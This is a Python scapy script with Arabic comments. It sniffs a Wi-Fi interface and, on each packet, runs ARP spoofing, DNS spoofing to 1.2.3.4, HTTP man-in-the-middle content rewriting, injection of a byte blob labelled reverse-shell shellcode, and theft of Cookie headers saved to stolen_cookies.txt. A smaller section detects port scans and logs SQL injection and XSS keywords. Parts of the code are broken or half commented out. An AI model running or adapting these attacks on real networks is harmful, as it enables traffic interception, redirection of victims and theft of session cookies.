import scapy
from scapy.all import *
from scapy.layers.http import HTTPRequest
from scapy.layers.dns import DNS, DNSQR, DNSRR
# from scapy.layers.ssl_tls import TLS
from scapy.layers.inet import IP, TCP, UDP, ICMP
from scapy.layers.l2 import ARP
from datetime import datetime
import base64

# إحصائيات الحزم الملتقطة
packet_stats = {
    "TCP": 0,
    "UDP": 0,
    "ICMP": 0,
    "ARP": 0,
    "HTTP": 0,
    "DNS": 0,
    "TLS": 0,
    "Other": 0
}

# هجوم ARP Spoofing
def arp_spoofing(pk):
    if pk.haslayer(ARP) and pk[ARP].op == 1:  # إذا كانت الحزمة طلب ARP
        # الرد بحزمة ARP مزيفة
        spoofed_arp = ARP(op=2, hwsrc="11:22:33:44:55:66", psrc=pk[ARP].pdst, hwdst=pk[ARP].hwsrc, pdst=pk[ARP].psrc)
        send(spoofed_arp, verbose=0)
        print(f"ARP Spoofing: Spoofed {pk[ARP].psrc}")

# هجوم DNS Spoofing
def dns_spoofing(pk):
    if pk.haslayer(DNS) and pk[DNS].qr == 0:  # إذا كانت الحزمة طلب DNS
        victim_ip = pk[IP].src
        fake_dns_response = IP(dst=victim_ip, src=pk[IP].dst) / \
                            UDP(dport=pk[UDP].sport, sport=pk[UDP].dport) / \
                            DNS(id=pk[DNS].id, qr=1, aa=1, qd=pk[DNS].qd, an=DNSRR(rrname=pk[DNS].qd.qname, ttl=10, rdata="1.2.3.4"))
        send(fake_dns_response, verbose=0)
        print(f"DNS Spoofing: Redirected {pk[DNS].qd.qname} to 1.2.3.4")

# هجوم Man-in-the-Middle (MITM) - اعتراض وتعديل البيانات
def mitm_attack(pk):
    if pk.haslayer(TCP) and pk.haslayer(Raw):
        raw_data = pk[Raw].load.decode(errors='ignore')
        if "HTTP" in raw_data:
            # تعديل البيانات الخام للحزمة واعتراضها
            print("MITM Attack: Intercepted HTTP data.")
            modified_data = raw_data.replace("OriginalContent", "ModifiedContent")
            new_pkt = IP(src=pk[IP].dst, dst=pk[IP].src) / TCP(sport=pk[TCP].dport, dport=pk[TCP].sport) / Raw(load=modified_data)
            send(new_pkt, verbose=0)

# حقن الشل العكسي (Reverse Shell)
def inject_reverse_shell(pk):
    if pk.haslayer(TCP) and pk.haslayer(Raw):
        raw_data = pk[Raw].load
        if "HTTP" in raw_data.decode(errors='ignore'):
            reverse_shell_payload = b"\x31\xdb\xbb\x0b\xba\x01\x89\xe1\x31\xc9\x66\xb9\x14\x03\x51\x89\xe1\xcd\x80\x31\xc9\x66\xb9\x0c\x03\x51\x89\xe1\xcd\x80\xeb\x17\x51\x89\xe1\x89\xde\x89\xdf\x51\x89\xe1\x89\xca\x66\x51\x68\x2f\x62\x69\x6e\x2f\x73\x68\x41\x51\x53\x89\xe1\x31\xd2\x52\x51\x53\x89\xe1\x49\xbd\x01\x0d\x0a\x51\x51\x51\x53\x89\xe1\x52\xe8\x3c\x04\x00\x00"
            new_pkt = IP(src=pk[IP].dst, dst=pk[IP].src) / TCP(sport=pk[TCP].dport, dport=pk[TCP].sport, flags="A") / Raw(load=reverse_shell_payload)
            send(new_pkt, verbose=0)

# سرقة ملفات تعريف الارتباط والجلسات (Cookies and Sessions)
def steal_cookies_and_sessions(pk):
    # if pk.haslayer(HTTP) and pk.haslayer(Raw):
        raw_data = pk[Raw].load.decode(errors='ignore')
        if "Cookie:" in raw_data:
            cookies = [line for line in raw_data.split("\r\n") if "Cookie:" in line]
            if cookies:
                print(f"Cookies Captured: {cookies}")
                with open("stolen_cookies.txt", "a") as f:
                    f.write(f"Captured at {datetime.now()} - {cookies}\n")

# تحليل بيانات SSL/TLS
def capture_tls_traffic(pk):
    # if pk.haslayer(TLS):
        print(f"Captured TLS traffic from {pk[IP].src} to {pk[IP].dst}")

# فحص المنافذ (Port Scanning)
def port_scanning(pk):
    if pk.haslayer(TCP):
        if pk[TCP].flags == "S":  # طلب SYN
            print(f"Port Scanning Detected: {pk[IP].src} is scanning port {pk[TCP].dport}")

# اكتشاف حقن SQL (SQL Injection)
def detect_sql_injection(pk):
    if pk.haslayer(Raw):
        raw_data = pk[Raw].load.decode(errors='ignore').lower()
        sql_keywords = ['select', 'union', 'insert', 'drop', '--', ';--', 'or', 'and', '1=1']
        if any(keyword in raw_data for keyword in sql_keywords):
            print(f"Potential SQL Injection Attempt Detected: {raw_data}")
            with open("sql_injection_log.txt", "a") as f:
                f.write(f"Detected at {datetime.now()} - {raw_data}\n")

# اكتشاف XSS (Cross-Site Scripting)
def detect_xss(pk):
    if pk.haslayer(Raw):
        raw_data = pk[Raw].load.decode(errors='ignore').lower()
        xss_patterns = ['<script>', 'onerror', 'alert(']
        if any(pattern in raw_data for pattern in xss_patterns):
            print(f"Potential XSS Attempt Detected: {raw_data}")
            with open("xss_log.txt", "a") as f:
                f.write(f"Detected at {datetime.now()} - {raw_data}\n")

# دالة التقاط الحزم واستدعاء دوال الهجمات المختلفة
def sn(pk):
    arp_spoofing(pk)  # ARP Spoofing
    dns_spoofing(pk)  # DNS Spoofing
    mitm_attack(pk)  # MITM Attack
    inject_reverse_shell(pk)  # حقن شل عكسي
    steal_cookies_and_sessions(pk)  # سرقة ملفات تعريف الارتباط والجلسات
    capture_tls_traffic(pk)  # تحليل بيانات TLS
    port_scanning(pk)  # اكتشاف فحص المنافذ
    detect_sql_injection(pk)  # اكتشاف حقن SQL
    detect_xss(pk)  # اكتشاف XSS

# تشغيل الـsniffer على واجهة معينة مع فلتر للحزم
def start_sniffer_background(iface="Wi-Fi", filter=None, count=0):
    try:
        print(f"Starting sniffer on interface: {iface}")
        sniff(iface=iface, prn=sn, filter=filter, count=count)
    except Exception as e:
        print(f"Error: {e}")

# بدء التقاط الحزم
start_sniffer_background(iface="Wi-Fi", filter="tcp or udp or port 53 or port 80", count=500)
